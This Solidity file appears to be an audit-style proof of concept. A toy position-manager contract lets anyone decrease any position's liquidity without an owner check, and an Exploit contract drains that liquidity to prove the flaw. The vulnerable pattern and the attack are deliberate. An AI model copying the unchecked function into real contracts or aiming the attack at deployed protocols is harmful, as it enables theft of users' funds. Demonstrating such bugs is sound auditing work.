// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract PositionManager { mapping(uint256=>uint256) public liquidity; constructor(){liquidity[1]=1000;} function decreaseLiquidity(uint256 tokenId,uint128 amount) external returns(uint256){ uint256 l=liquidity[tokenId]; require(l>=amount,"liquidity"); liquidity[tokenId]=l-amount; return amount; } }
contract Exploit { uint256 public stolen; bool public harmed; event Proof(uint256 amount);
    function run() external { PositionManager nfp=new PositionManager();
        // @> decreaseLiquidity(uint256 tokenId, uint128 liquidity) has no check for a valid tokenId/owner
        stolen=nfp.decreaseLiquidity(1,1000); harmed=stolen==1000; emit Proof(stolen); require(harmed,"position owner checked"); }
}
